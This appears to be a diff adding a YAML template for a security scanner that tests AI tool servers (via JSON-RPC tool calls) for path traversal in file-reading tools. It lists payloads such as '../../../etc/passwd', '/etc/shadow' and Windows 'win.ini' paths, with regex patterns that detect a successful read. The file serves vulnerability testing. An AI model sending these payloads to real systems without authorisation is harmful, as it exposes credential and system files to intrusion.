@@ -1,0 +1,44 @@
+version: "1"
+name: "tool-path-traversal"
+severity: critical
+description: >
+  Inject path traversal sequences into the path parameter of file-reading
+  tools. Uses ${matched_param} to dynamically adapt to any parameter name
+  (path, file_path, filename, filepath, file, location, etc.) — no
+  hardcoding required.
+
+requires:
+  tools:
+    - "read_file|read_text_file|readFile|get_file|getFile|file_read|read"
+  inject_into: "path|file|filename|filepath|file_path|location|src|source"
+
+steps:
+  - id: list_tools
+    type: setup
+    method: tools/list
+    params: {}
+    extract:
+      all_tools: "$.result.tools[*].name"
+    optional: true
+
+  - id: probe_path
+    type: mutate
+    method: tools/call
+    params:
+      name: "${matched_tool}"
+      arguments:
+        "${matched_param}": "${payload}"
+    payloads:
+      - "/etc/passwd"
+      - "../../../etc/passwd"
+      - "../../../../etc/passwd"
+      - "../../../../../etc/passwd"
+      - "/etc/shadow"
+      - "/proc/version"
+      - "/etc/hosts"
+      - "C:\\windows\\win.ini"
+      - "..\\..\\..\\.\\windows\\win.ini"
+    matchers:
+      - type: jsonrpc_success
+      - type: regex
+        pattern: "root:x:0:0|Linux version|localhost|127\\.0\\.0\\.1|\\[fonts\\]|root:\\$"
